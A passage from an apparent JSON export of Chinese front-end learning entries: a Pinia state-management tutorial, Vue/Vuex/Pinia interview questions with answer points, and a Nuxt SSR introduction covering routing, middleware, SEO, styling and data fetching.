userUsersStore = defineStore('users', {\n  getters: {\n    getUserById: (state) => {\n      return (userId) => state.users.find((user) => user.id === userId)\n    },\n  },\n})\n\n<template>\n  <p>User 2: {{ getUserById(2) }}</p>\n</template>\n```\n\n## 访问其他Store里的Getter\n\n将要访问的`store`引入并实例就可以\n\n```ts\nimport { useOtherStore } from './other-store'\n\nexport const useStore = defineStore('main', {\n  state: () => ({\n    // ...\n  }),\n  getters: {\n    otherGetter(state) {\n      const otherStore = useOtherStore()\n      return state.localData + otherStore.data\n    },\n  },\n})\n```\n\n# action\n\n`action`相当于`method`，和`Vuex`不同的是它异步同步都可以定义。\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 100\n    }\n  },\n  actions:{\n    async getUserInfo {\n      ...\n    }\n  }\n})\n```\n\n和`getter`一样，也可以通过`this`访问`state`数据\n\n```ts\n\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 100\n    }\n  },\n  actions:{\n    randomizeCounter() {\n      this.count = Math.round(100 * Math.random())\n    },\n  }\n})\n\n```\n\n在模版上也是和其他一样通过`store`直接访问。\n\n```html\n<template>\n  <button type=\"button\" @click=\"getUserInfo\">获取</button>\n</template>\n```\n\n## 监听\n\n可以通过`store.$onAction()`来监听 `action` 和它们的结果。第一个参数为回调函数，可以获取`action 的一些信息，第二个参数如果想在组件卸载后依旧保留它们，将` true`作为第二个参数传递给`action\\` 订阅器。\n\n它返回一个函数，可以在必要的时候调用函数，此时会删除订阅器取消监听。\n\n```ts\n\n<script setup lang=\"ts\">\nimport { userUsersStore } from './stores'\n\nconst store = userUsersStore()\n\nconst unsubscribe = store.$onAction(({ name, store, args, after, onError }) => {})\n\n// 取消监听\nunsubscribe()\n\n</script>\n```\n\n# 数据持久化\n\n和`Vuex`一样，都存在刷新后数据就会丢失，可以通过[pinia-plugin-persistedstate](https://github.com/prazdevs/pinia-plugin-persistedstate \"https://github.com/prazdevs/pinia-plugin-persistedstate\")插件来解决。\n\n通过在将数据存储到本地`storage`中，避免数据刷新丢失。储存位子有两个一个是`LocalStorage`和`SessionStorage`，具体看个人情况使用。\n\n针对存储的位置，在使用的时候需要考虑项目是否真的要存储在某个位置，合理使用。不能说将用户头像、名称等信息存储在`SessionStorage`中，网站关闭后数据也还是会丢失。也不能说将`IM`聊天室消息、所有用户信息等数据存储在`LocalStorage`中，存储的大小也有限制，这是时候就要使用`IndexDB`、`web SQL`等方式。所以需要结合项目功能情况。合理选择存储，而不是一股脑的使用。\n\n## 安装\n\n```bash\nnpm i pinia-plugin-persistedstate\n```\n\n将插件添加到`pinia`实例上\n\n```ts\n// main.ts\nimport { createPinia } from 'pinia'\nimport piniaPluginPersistedstate from 'pinia-plugin-persistedstate'\n\nconst pinia = createPinia()\npinia.use(piniaPluginPersistedstate)\n```\n\n## 使用\n\n在创建`store`时，设置`persist: true`\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 1\n    }\n  },\n  getters: {\n    ...\n  },\n  actions: {\n    ...\n  },\n  persist: true\n})\n```\n\n设置完后可以在网页中看到数据存储在`localStorage`中\n\n![Pasted image 20230710181703.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/32c34dabc1714f8e81b6446b4a9ae76e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=911&h=759&s=76353&e=png&b=fefefe)\n\n## 配置persist\n\n`persist`可以接收一个对象\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 1\n    }\n  },\n\n  persist: {\n    key: 'my-custom-key',\n    storage: sessionStorage,\n    paths: ['current'],\n    serializer: {\n      deserialize: parse,\n      serialize: stringify,\n    },\n    beforeRestore: (ctx) => {\n      console.log(`即将恢复 '${ctx.store.$id}'`)\n    },\n     afterRestore: (ctx) => {\n      console.log(`刚刚恢复完 '${ctx.store.$id}'`)\n    },\n  }\n})\n```\n\n-   `key`： 用于引用 `storage` 中的数据，默认使用`store`中的`Id`\n-   `storage`：数据存储位置，默认`localStorage`，可以该为`sessionStorage`\n-   `paths`：指定`state`中哪些数据需要持久化\n-   `serializer`：指定持久化时所使用的序列化方法，以及恢复 `store` 时的反序列化方法。\n-   `beforeRestore`：该 `hook` 将在从 `storage` 中恢复数据之前触发，并且它可以访问整个 `PiniaPluginContext`，这可用于在恢复数据之前强制地执行特定的操作。\n-   `afterRestore`：该 `hook` 将在从 `storage` 中恢复数据之后触发，并且它可以访问整个 `PiniaPluginContext`，这可用于在恢复数据之后强制地执行特定的操作。\n\n## 全局配置\n\n使用全局配置，就不用单独在每个`store`里面做配置，在使用`pinia use`的时候就可以通过`createPersistedState`函数设置。\n\n```ts\n// main.ts\nimport { createPinia } from 'pinia'\nimport { createPersistedState } from 'pinia-plugin-persistedstate'\n\nconst pinia = createPinia()\n\npinia.use(\n  createPersistedState({\n    storage: sessionStorage,\n    paths: ['current'],\n  })\n)\n```\n\n`createPersistedState`里的配置会将每个申明`persist: true`的`store`添加上配置，但是**每个单独`store`里的配置将会覆盖调全局声明中的对应项**。\n\n全局配置支持一下属性：\n\n-   **storage**\n-   **serializer**\n-   **beforeRestore**\n-   **afterRestore**\n\n## 启用所有 Store 默认持久化\n\n该配置将会使所有 `store` 持久化存储，且必须配置 `persist: false` 显式禁用持久化。\n\n```ts\nimport { createPinia } from 'pinia'\nimport { createPersistedState } from 'pinia-plugin-persistedstate'\n\nconst pinia = createPinia()\n\npinia.use(\n  createPersistedState({\n    auto: true,\n  })\n)\n```\n\n## Store多个持久化配置\n\n在一些特殊情况下，每个`store`中的数据存储的位置不一样，可以将`persist`设置为接收多个配置形式。\n\n```ts\nimport { defineStore } from 'pinia'\n\ndefineStore('store', {\n  state: () => ({\n    toLocal: '',\n    toSession: '',\n    toNowhere: '',\n  }),\n  persist: [\n    {\n      paths: ['toLocal'],\n      storage: localStorage,\n    },\n    {\n      paths: ['toSession'],\n      storage: sessionStorage,\n    },\n  ],\n})\n```\n\n## 强制恢复数据\n\n每个 `store` 都有 `$hydrate` 方法来手动触发数据恢复。默认情况下，调用此方法还将触发 `beforeRestore` 和 `afterRestore` 钩子。但是可以通过配置方法来避免这两个钩子触发。\n\n```ts\nimport { defineStore } from 'pinia'\n\nconst useStore = defineStore('store', {\n  state: () => ({\n    someData: '你好 Pinia',\n  }),\n})\n```\n\n调用 `$hydrate` 方法：\n\n```ts\nconst store = useStore()\n\nstore.$hydrate({ runHooks: false })\n```\n\n这将从 `storage` 中获取数据并用它替换当前的 `state`。并且在上面的示例中，配置了`runHooks: false`，所以 `beforeRestore` 和 `afterRestore` 钩子函数不会被触发。\n\n## 强制持久化\n\n除了通过`persist`方式设置持久化，每个`store`都有`$persist`方法来手动触发持久化，这会强制将 `store state` 保存在已配置的 `storage` 中。\n\n```ts\nimport { defineStore } from 'pinia'\n\nconst useStore = defineStore('store', {\n  state: () => ({\n    someData: '你好 Pinia',\n  }),\n})\n\n// App.vue\nconst store = useStore()\n\nstore.$persist()\n```",
    "testPoint": "### **1. 基本概念**\n#### **问题：**\n1. 什么是状态管理？为什么需要状态管理工具？  \n2. Vue 的状态管理有哪些解决方案？  \n\n#### **考察点：**\n- **定义**：\n  - 状态管理是为了管理应用中的共享状态，特别是在组件间需要频繁通信或多级传递的情况下。\n\n- **状态管理的解决方案**：\n  - 简单项目：通过 `props` 和 `$emit` 实现父子通信。\n  - 中等复杂项目：通过 **事件总线** 或 **依赖注入**（`provide` 和 `inject`）。\n  - 大型项目：借助 Vuex 或 Pinia 实现全局状态管理。\n\n---\n\n### **2. 组件间通信**\n#### **问题：**\n1. Vue 父子组件如何通信？  \n2. 如何实现兄弟组件的通信？  \n3. 多层级组件间的数据传递有哪些方法？\n\n#### **考察点：**\n- **父子通信**：\n  - 父传子：通过 `props`。\n  - 子传父：通过 `$emit` 触发事件。\n\n- **兄弟组件通信**：\n  - 使用 **事件总线**。\n    ```javascript\n    // EventBus.js\n    import Vue from 'vue';\n    export const EventBus = new Vue();\n\n    // 在组件 A 中\n    EventBus.$emit('eventName', data);\n\n    // 在组件 B 中\n    EventBus.$on('eventName', callback);\n    ```\n\n- **跨层级通信**：\n  - 使用 `provide` 和 `inject`：\n    ```javascript\n    // 父组件\n    provide('key', value);\n\n    // 子组件\n    inject('key');\n    ```\n\n- **状态共享**：\n  - 利用 Vuex、Pinia 或全局变量。\n\n---\n\n### **3. Vuex（集中式状态管理）**\n#### **问题：**\n1. Vuex 的核心概念是什么？  \n2. Vuex 中 `state`、`getters`、`mutations`、`actions` 的作用是什么？  \n3. Vuex 的状态是如何注入组件的？  \n\n#### **考察点：**\n- **核心概念**：\n  - **单一状态树**：应用的所有状态都集中在一个对象中，便于追踪和管理。\n  - **Vuex 的四个核心模块**：\n    - `state`：存储共享状态。\n    - `getters`：计算属性，用于派生状态。\n    - `mutations`：同步修改状态的方法。\n    - `actions`：异步操作，通过提交 `mutations` 改变状态。\n\n- **代码示例**：\n  ```javascript\n  const store = new Vuex.Store({\n    state: {\n      count: 0\n    },\n    getters: {\n      doubleCount: state => state.count * 2\n    },\n    mutations: {\n      increment(state) {\n        state.count++;\n      }\n    },\n    actions: {\n      asyncIncrement({ commit }) {\n        setTimeout(() => {\n          commit('increment');\n        }, 1000);\n      }\n    }\n  });\n  ```\n\n- **状态注入组件**：\n  - 使用 `mapState`、`mapGetters` 辅助函数：\n    ```javascript\n    import { mapState, mapGetters } from 'vuex';\n    computed: {\n      ...mapState(['count']),\n      ...mapGetters(['doubleCount'])\n    }\n    ```\n\n---\n\n### **4. Pinia（新一代状态管理工具）**\n#### **问题：**\n1. Pinia 与 Vuex 有什么区别？  \n2. Pinia 是如何定义和使用状态的？  \n3. 如何在 Pinia 中实现模块化管理？  \n\n#### **考察点：**\n- **Pinia 的特点**：\n  - 更简单的 API，基于 Composition API 实现。\n  - 更好的开发体验（如类型推导、支持 SSR）。\n  - 不再区分 `mutations` 和 `actions`，状态修改直接在 `actions` 中完成。\n\n- **代码示例**：\n  ```javascript\n  import { defineStore } from 'pinia';\n\n  export const useCounterStore = defineStore('counter', {\n    state: () => ({\n      count: 0\n    }),\n    getters: {\n      doubleCount: state => state.count * 2\n    },\n    actions: {\n      increment() {\n        this.count++;\n      },\n      asyncIncrement() {\n        setTimeout(() => {\n          this.increment();\n        }, 1000);\n      }\n    }\n  });\n  ```\n\n- **模块化管理**：\n  - 每个模块独立定义 `store`，通过 `useStore` 调用。\n\n---\n\n### **5. 状态持久化**\n#### **问题：**\n1. Vuex/Pinia 的状态刷新后如何保持？  \n2. 如何将 Vuex 的状态存储到 `localStorage` 或 `sessionStorage` 中？  \n\n#### **考察点：**\n- **状态持久化方法**：\n  - 利用第三方库 `vuex-persistedstate`：\n    ```javascript\n    import createPersistedState from 'vuex-persistedstate';\n\n    const store = new Vuex.Store({\n      plugins: [createPersistedState()]\n    });\n    ```\n  - 手动监听状态变化并保存：\n    ```javascript\n    store.subscribe((mutation, state) => {\n      localStorage.setItem('state', JSON.stringify(state));\n    });\n    ```\n\n---\n\n### **6. 状态管理中的性能问题**\n#### **问题：**\n1. Vuex 的状态管理可能会导致哪些性能问题？如何优化？  \n2. 组件依赖 Vuex 状态时如何避免不必要的更新？  \n\n#### **考察点：**\n- **性能问题**：\n  - 全局状态更新可能导致过多的组件重新渲染。\n  - 状态树过大可能影响调试和开发效率。\n\n- **优化方法**：\n  - 拆分模块，按需加载状态。\n  - 使用 `getters` 提取需要的部分状态。\n  - 使用 `Vue.set` 确保响应性。\n\n---\n\n### **7. 状态管理的适用场景**\n#### **问题：**\n1. 在哪些情况下需要引入 Vuex 或 Pinia？哪些场景可以避免使用全局状态管理工具？  \n2. 如果项目非常简单，是否推荐直接使用 Vuex？\n\n#### **考察点：**\n- **适用场景**：\n  - 当多个组件需要共享状态且层级较深时，引入 Vuex 或 Pinia。\n  - 小型项目可以直接使用 `provide` 和 `inject`。\n\n- **避免滥用**：\n  - 不要将所有状态都放入 Vuex，应将仅需共享的部分存储到全局状态中。\n\n---\n\n### **8. 状态管理的替代方案**\n#### **问题：**\n1. 除了 Vuex 和 Pinia，还有哪些状态管理方案可以应用于 Vue 项目？  \n2. 使用第三方库（如 Redux）有什么优缺点？\n\n#### **考察点：**\n- **其他方案**：\n  - 使用 `reactive` 或 `ref` 实现简单的状态共享。\n  - 使用 RxJS 管理复杂的异步数据流。\n\n- **第三方库**：\n  - Redux：功能强大，但与 Vue 的风格不完全一致，可能增加学习成本。",
    "exerciseKeyList": "[\"ae11a7eb-f3b1-487a-9ddc-8c4e29b9d81a\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-05T03:20:25.000Z",
    "updateAt": "2024-12-17T01:22:03.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "ae11a7eb-f3b1-487a-9ddc-8c4e29b9d81a",
        "title": "说说 Pinia 与 Vuex 的区别",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-12-17T01:21:35.000Z",
        "updateAt": "2024-12-17T01:21:42.000Z"
      }
    ]
  },
  "84": {
    "id": 84,
    "tagId": 14,
    "title": "服务器渲染",
    "explanation": "## 前言\n\n什么是SSR(Server-Side Rendering)？类似于用Java、ASP.NET、php开发前端页面，服务端准备数据并执行页面渲染，然后把完整的HTML发送给客户端。现代化的SSR通常和Vue、React等前端框架强关联，通过Node.js在服务端提前将page、component使用同构方式渲染为html代码，其目的是在实现SSR时尽量复用一套渲染机制。例如Vue框架就同时支持了CSR(Client-Side Rendering)和SSR。\n\nSSR能解决什么问题？\n\n-   SEO: `Google`、`百度`、`Yandex`、`Bing`或者`Yahoo`等搜索引擎会通过网络爬取你的页面并建立索引，如果的信息越完整，那么你的网站就更容易被检索到。使用SSR技术，让页面在服务端提前渲染好再返回给客户端，这样各类搜索引擎就能拿到比较完整的页面信息，提升检索质量。\n    \n-   首屏渲染：SPA(Single Page Application)将页面渲染放到客户端执行，并且在渲染之前要加载大量的Javascript代码，所以首屏渲染需要花费较长时间。而SSR直接在服务端渲染完再返回客户端，使用户能够快速看到页面内容。\n    \n\n**有哪些框架支持SSR？**\n\n| 开源库 | 支持语言 | star数 | 描述 |\n| --- | --- | --- | --- |\n| [Nuxt](https://github.com/nuxt/nuxt \"https://github.com/nuxt/nuxt\") | Vue | 54.9k | 快速构架、类型安全、高性能、易扩展 |\n| [Next](https://github.com/vercel/next.js \"https://github.com/vercel/next.js\") | React | 127k | 老牌框架、社区完善、Data Fetch、Styling |\n| [quasar](https://quasar.dev/ \"https://quasar.dev/\") | Vue | 26k | 丰富的UI、支持桌面端和移动端 |\n| [Remix](https://remix.run/ \"https://remix.run/\") | React | 29.9k | 极致的用户体验、开箱即用 |\n\n本知识点将以 Nuxt 为例，介绍如何实现 SSR。\n\n## 什么是Nuxt\n\n![image.png](https://static.ecool.fun//article/9f2698b2-0040-4dc2-8cd4-5f351382c0aa.awebp)\n\n基于Vue、React、Angular实现的`full-stack`框架数不胜数，但就Vue框架领域内，应该数Nuxt最为Top 1。Nuxt保持了`Vue`生态的`“开箱即用”`特性，类似于Vite，几条指令就可直接run起来。如果你熟悉Vue，那么基于Nuxt写应用，体验上和写Vue客户端应用极其相似。\n\nNuxt提前预制了一套目录结构，并自动处理路由、导入、数据获取，开发人员仅需按约定的规则实现页面、组件、数据API即可，极大降低开发人员学习成本。Nuxt的特性可总结为：\n\n-   基于文件的路由: 页面统一添加到`pages/`目录下，例如添加index.vue、about.vue、contact.vue，就可以通过`/`访问首页，通过`/about`返回关于页面；\n-   代码分割：得益于Vue的`Virtual Node`，Nuxt根据目录规则提前生成完整的依赖树，这样能够将所有code拆分为最小单元的`chunks`, 从而减少应用初始化加载时间；\n-   开箱即用的SSR：Nuxt内部使用Vue的SSR，除了Vue实现SSR、CSR本身的差异，可以像开发CSR的Vue应用一样来开发SSR，降低研发心智负担；\n-   自动导入：在实现页面或组件时，不需要像CSR手动导入(`import Card from './Card.Vue'`)依赖，当Nuxt识别到有使用外部组件，bundle过程会自动识别；\n-   数据获取工具：提供一套组合式FetchAPI，实现client、server端的同构；\n-   配置好的构建工具：**默认使用Vite构建，同时支持Webpack、Rspack**；\n\nNuxt的架构设计和`vue/core`很相似，将整体功能拆分为独立的package:\n\n-   核心引擎：[nuxt](https://github.com/nuxt/nuxt/tree/main/packages/nuxt \"https://github.com/nuxt/nuxt/tree/main/packages/nuxt\")；\n-   bundlers: 打包器包含`@nuxt/vite-builde`、`nuxt/webpack-builder`、`@nuxt/rspack-builder`；\n-   命令行工具：[nuxi](https://github.com/nuxt/nuxt/tree/main/packages/nuxi \"https://github.com/nuxt/nuxt/tree/main/packages/nuxi\")；\n-   服务端引擎：[nitro](https://github.com/unjs/nitro \"https://github.com/unjs/nitro\")；\n-   开发套件：[@nuxt/kit](https://github.com/nuxt/nuxt/tree/main/packages/kit \"https://github.com/nuxt/nuxt/tree/main/packages/kit\")；\n\n## 上手体验\n\n### 初始化项目\n\n使用`nuxi`提供的指令初始化项目：\n\n```kotlin\nnpx nuxi@latest init nuxt-learn-examples\n```\n\n如果安装过程下载失败，可能需要配置hosts:\n\n```auto\n185.199.108.133 raw.githubusercontent.com\n```\n\n**最新nuxt版本3.14初始化的项目目录比较简单，少了pages、plugins等目录**，入口为`app.vue`：\n\n![image.png](https://static.ecool.fun//article/5115823e-5d84-4148-a044-324e755b6f5d.awebp)\n\nnuxt默认在`app.vue`中添加了两个demo组件，需要手动删除，并安需添加路由组件:\n\n```xml\n<template>\n  <NuxtPage />\n</template>\n```\n\n**如果要使用三方的UI组件，例如`element-ui`，先创建`plugins`目录，并添加`element-ui.ts`**，nuxt框架在构建过程会自动加载plugins目录下的所有插件。\n\n```javascript\nimport Vue from 'vue'\nimport Element from 'element-ui'\nimport locale from 'element-ui/lib/locale/lang/en'\n\nVue.use(Element, { locale })\n```\n\n### 路由\n\nNuxt基于`Vue-Router`实现路由，区别于CSR路由，使用Nuxt仅需要在pages目录下添加页面，并且支持动态路由。例如新增目录：\n\n```markdown\n- pages\n    - index.vue\n    - about.vue\n    - products\n        - [id].vue\n```\n\nNuxt会自动将文件转换为`Vue-Router`的路由配置:\n\n```json\n{\n  \"routes\": [\n    {\n      \"path\": \"/index\",\n      \"component\": \"pages/index.vue\"\n    },\n    {\n      \"path\": \"/about\",\n      \"component\": \"pages/about.vue\"\n    },\n    {\n      \"path\": \"/products/:id\",\n      \"component\": \"pages/products/[id].vue\"\n    }\n  ]\n}\n```\n\n**Nuxt提供`<NuxtLink>`创建导航连接，例如`<NuxtLink to=\"/about\">关于</NuxtLink>`，当`<NuxtLink>`标签在视图范围内可见，则自动预取链接页面的组件，从而加快导航速度。**\n\n在写SPA页面时，可通过`router.beforeEach((to, from, next) => {}`添加路由验证、拦截。而Nuxt通过路由中间件形式实现路由拦截，在`middleware`目录下添加`auth.ts`文件：\n\n```javascript\nexport default defineNuxtRouteMiddleware((to, from) => {\n  if (isAuthenticated() === false) {\n    return navigateTo('/login')\n  }\n})\n```\n\n**`navigationTo`函数重定向到给定的路径，并在服务端发生重定向时设置response code为`302`。 文件名`auth`也会作为中间件的ID，路由对哪些页面生效，需要在页面添加中间件配置，指明需要使用哪些中间件。**\n\n```xml\n<script setup lang=\"ts\">\ndefinePageMeta({\n  middleware: 'auth'\n})\n</script>\n```\n\n**如果中间件是全局性的，则可以通过添加`global`后缀标示**，例如`setup.global.ts`。\n\n**当有多个中间件被执行时，按什么顺序执行**？nuxt根据文件名按字母进行排序，可通过如下形式排好执行顺序：\n\n```csharp\nmiddleware/\n    01.setup.global.ts\n    02.analytics.global.ts\n    auth.ts\n```\n\n**除了通过在middleware目录下添加中间件外，`Nuxt`提供了动态添加中间件方式`addRouteMiddleware`**，例如在插件中添加。\n\n```javascript\nexport default defineNuxtPlugin(() => {\n  addRouteMiddleware('setup', () => {\n  }, { global: true })\n}\n```\n\n### SEO和Meta\n\n`Nuxt`提供了多种设置SEO和head属性的方法，不管是配置或者函数都提供完整的TypeScript支持。\n\n**`useSEOMeta`函数支持通过一个扁平化的Object对象设置SEO相关属性**。\n\n```php\n<script setup lang=\"ts\">\nuseSeoMeta({\n  title: '淘贝购物',\n  ogTitle: '陶贝购物',\n  description: '我是一个购物网站，比淘宝还厉害。',\n  ogDescription: '我是一个购物网站，比淘宝还厉害。',\n  ogImage: 'https://taobei.com/image.png',\n  twitterCard: 'taobei_summary_large_image',\n})\n</script>\n```\n\n除了通过`useSEOMeta`函数设置SEO属性，**`Nuxt`还提供了`<Title>`、`<Base>`、`<NoScript>`、`<Style>`、`<Meta>`、`<Link>`、`<Body>`、`<Html>`和`<Head>`组件可直接在template使用。** 例如在Head组件下添加Title、Meta、Style。\n\n```xml\n<script setup lang=\"ts\">\nconst title = ref('你好，世界')\n</script>\n\n<template>\n  <div>\n    <Head>\n      <Title>{{ title }}</Title>\n      <Meta name=\"description\" :content=\"title\" />\n      <Style type=\"text/css\" children=\"body { background-color: green; }\" />\n    </Head>\n\n    <h1>{{ title }}</h1>\n  </div>\n</template>\n\n```\n\n除了使用组件形式为head添加Meta信息外，还可以使用`useHead`函数设置。例如在app.vue添加：\n\n```ini\n<script setup lang=\"ts\">\nconst description = ref('我的神奇网站。')\n\nuseHead({\n  meta: [\n    { name: 'description', content: description }\n  ],\n})\n</script>\n```\n\n如果想引入外部css、字体等资源，也可以通过`useHead`的Link属性设置。\n\n```php\n<script setup lang=\"ts\">\nuseHead({\n  link: [\n    {\n      rel: 'preconnect',\n      href: 'https://fonts.googleapis.com'\n    },\n    {\n      rel: 'stylesheet',\n      href: 'https://fonts.googleapis.com/css2?family=Roboto&display=swap',\n      crossorigin: ''\n    }\n  ]\n})\n</script>\n```\n\n### 样式使用\n\n在样式化方面，Nuxt 非常灵活。你可以编写自己的样式，或者引用本地和外部样式表。 你可以使用 CSS 预处理器、CSS 框架、UI 库和 Nuxt 模块来为你的应用程序添加样式。\n\n本地编写的样式表，可将其放到`assets`目录下，如果想在组件中引入这些css文件，可通过javascript的import，或者使用css的`@import`语句。\n\n```xml\n<script>\nimport '~/assets/css/first.css'\n</script>\n\n<style>\n@import url(\"~/assets/css/second.css\");\n</style>\n```\n\n一些css文件需要全局导入，那么可以在`nuxt.config.ts`文件添加css文件导入。\n\n```arduino\nexport default defineNuxtConfig({\n  css: ['~/assets/css/main.css']\n})\n\n```\n\n如果要使用字体文件，可将字体文件放到`public`目录下，例如放到`public/fonts/FarAwayGalaxy.woff`。这样就可以在css样式中使用这些字体了。\n\n```css\n// 字体定义\n@font-face {\n  font-family: 'FarAwayGalaxy';\n  src: url('/fonts/FarAwayGalaxy.woff') format('woff');\n  font-weight: normal;\n  font-style: normal;\n  font-display: swap;\n}\n\n// 字体使用:\nh1 {\n  font-family: 'FarAwayGalaxy', sans-serif;\n}\n```\n\n通过`npm`安装的样式，例如`npm install animate.css`，可直接在组件中使用， 可使用javascript的import或者style的@import方式导入。\n\n```xml\n<script>\nimport 'animate.css'\n</script>\n\n<style>\n@import url(\"animate.css\");\n</style>\n```\n\n如果想把`animate.css`添加到全局，上文中有介绍在nuxt.config.ts中导入。\n\n```arduino\nexport default defineNuxtConfig({\n  css: ['animate.css']\n})\n\n```\n\n引入三方cdn的css资源，一般会添加到head的link中。添加方式包含静态、动态两种。静态方式为在`nuxt.cofig.ts`的head属性下附加`link`属性，如下述代码所示。\n\n```php\nexport default defineNuxtConfig({\n  app: {\n    head: {\n      link: [{ rel: 'stylesheet', href: 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css' }]\n    }\n}})\n```\n\n动态方式可使用`useHead`函数添加三方css资源。\n\n```php\nuseHead({\n  link: [{ rel: 'stylesheet', href: 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css' }]\n})\n```\n\n`Nuxt`框架下，组件使用样式方式和客户端组件类似。\n\n```xml\n<script setup lang=\"ts\">\nconst isActive = ref(true)\nconst hasError = ref(false)\nconst classObject = reactive({\n  active: true,\n  'text-danger': false\n})\n</script>\n\n<template>\n  <div class=\"static\" :class=\"{ active: isActive, 'text-danger': hasError }\"></div>\n  <div :class=\"classObject\"></div>\n</template>\n```\n\n像客户端支持的.scss、.sass、.less、.styl 和 .stylus，`Nuxt`也支持在组件的style标签上设置lang，例如`<style lang=\"less\"></style`。\n\n### 数据获取\n\nNuxt 提供了两个组合函数和一个内置库，用于在浏览器或服务器环境中执行数据获取：`useFetch`、[`useAsyncData`](https://nuxt.com.cn/docs/api/composables/use-async-data \"https://nuxt.com.cn/docs/api/composables/use-async-data\") 和 `$fetch`。\n\n**请求数据为什么需要特定的组合函数？一个组件在服务端、客户端都被执行，通过组合函数能解决服务端、客户端的同构问题，让数据请求在两个端都能正常运行，可避免数据重复请求以及异步加载等问题。**\n\n**解决网络重复请求**\n\n[`useFetch`](https://nuxt.com.cn/docs/api/composables/use-fetch \"https://nuxt.com.cn/docs/api/composables/use-fetch\") 和 [`useAsyncData`](https://nuxt.com.cn/docs/api/composables/use-async-data \"https://nuxt.com.cn/docs/api/composables/use-async-data\") 组合函数确保一旦在服务器上进行了 API 调用，数据将以有效的方式在负载中传递到客户端。只要服务端执行过`useFetch`、`useAsyncData`函数，则其结果将被序列化传送给客户端，而客户端通过`useNuxtApp().payload`访问这些数据。\n\n使用 [Nuxt DevTools](https://devtools.nuxt.com/ \"https://devtools.nuxt.com/\") 在 **Payload 选项卡** 中检查此数据。\n\n![image.png](https://static.ecool.fun//article/38dac0c6-53b8-46f5-8f6c-6726f219dfcd.awebp)\n\n**解决数据请求和界面交互同步**\n\n组件支持`top level`方式请求数据，例如直接在script下使用useFetch获取数据，并且一个页面下可能有多个组件都会请求数据，那何时界面可交互？Nuxt 在底层使用 Vue 的 [`<Suspense>`](https://vuejs.org/guide/built-ins/suspense \"https://vuejs.org/guide/built-ins/suspense\") 组件防止在数据请求完成前进行交互、导航。\n\n```xml\n<script setup lang=\"ts\">\nconst { data: count } = await useFetch('/api/count')\n</script>\n\n<template>\n  页面访问量：{{ count }}\n</template>\n```\n\n**$ofetch**\n\nNuxt 包括了 `ofetch` 库，并且作为全局别名 `$fetch` 自动导入到应用程序中。它是 `useFetch` 在幕后使用的工具。\n\n`ofetch` 库是基于 [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch \"https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch\") 构建的，并为其添加了便利功能：\n\n-   在浏览器、Node 或 worker 环境中的使用方式相同\n-   自动解析响应\n-   错误处理\n-   自动重试\n-   拦截器\n\n什么时候使用`$fetch`？当客户端异步提交数据时，不涉及到页面状态，因此可直接使用$fetch提交数据。\n\n**仅在客户端获取数据**\n\n默认情况下，`useFetch`组合函数在客户端、服务端都会执行，可通过给第二个参数`server:false`关闭服务端的请求。对于首次渲染不需要的数据(如非SEO敏感数据)，可通过设置`lazy: true`让首次渲染不用等待该请求。\n\n```php\n/* 此调用仅在客户端执行 */\nconst { pending, data: posts } = useFetch('/api/comments', {\n  lazy: true,\n  server: false\n})\n```\n\n**缓存和重新获取数据**\n\n`useFetch`使用提供的url作为缓存键，也可在最后一个options参数显式指定key作为缓存键。\n\n[`useAsyncData`](https://nuxt.com.cn/docs/api/composables/use-async-data \"https://nuxt.com.cn/docs/api/composables/use-async-data\")如果第一个参数是字符串，则将其用作缓存键。如果第一个参数是执行查询的处理函数，则**会为`useAsyncData`的实例生成一个基于文件名和行号的唯一键**。\n\n**`useFetch`将返回的数据转换为响应式，并且提供了手动请求或刷新的方法。**\n\n```xml\n<script setup lang=\"ts\">\nconst { data, error, execute, refresh } = await useFetch('/api/users')\n</script>\n\n<template>\n  <div>\n    <p>{{ data }}</p>\n    <button @click=\"refresh\">刷新数据</button>\n  </div>\n</template>\n```\n\n**想要查询条件变化时自动重新请求数据？** 可在options的watch属性指定监听值。\n\n```csharp\nconst id = ref(1)\nconst { data, error, refresh } = await useFetch('/api/users', {\n  /* 更改id将触发重新获取 */\n  watch: [id]\n})\n```\n\n如果**query的参数变化也自动请求，只要传递的响应式**，则`useFetch`会帮你自动完成监听。\n\n```php\nconst id = ref(null)\nconst { data, pending } = useLazyFetch('/api/user', {\n  query: {\n    user_id: id\n  }\n})\n```\n\n### 状态管理\n\nNuxt提供了强大的状态管理库和useState组合函数，用于创建响应式且适用于SSR的共享状态。`useState`用于在组件之间创建响应式且适用于SSR的共享状态。\n\n**`useState`的值将在服务端渲染后保留，并在客户端渲染期间进行水合(hydration),其唯一键在多个组件间共享。由于`useState`在服务端渲染后要传递给客户端，需进行序列化，所以像类、函数等不支持共享。**\n\n如何共享？例如在app.vue中使用useState定义了key为counter的state，其他组件可通过`useState('counter')`获取key为counter的state值。\n\n```xml\n<script setup lang=\"ts\">\nconst counter = useState('counter', () => Math.round(Math.random() * 1000))\n</script>\n\n<template>\n  <div>\n    计数器：{{ counter }}\n    <button @click=\"counter++\">\n      +\n    </button>\n    <button @click=\"counter--\">\n      -\n    </button>\n  </div>\n</template>\n```\n\n**如何定义全局状态？**\n\n通过使用**自动导入的组合函数**，我们可以定义全局类型安全的状态并在整个应用程序中导入它们。例如添加`composables/states.ts`文件并附加内容：\n\n```typescript\nexport const useCounter = () => useState<number>('counter', () => 0)\nexport const useColor = () => useState<string>('color', () => 'pink')\n```\n\n那么服务端在渲染每一个页面时都会加载`states.ts`中的状态，因此可以在组件中直接读取。\n\n```xml\n<script setup lang=\"ts\">\nconst color = useColor() // 与useState('color')相同\n</script>\n\n<template>\n  <p>当前颜色：{{ color 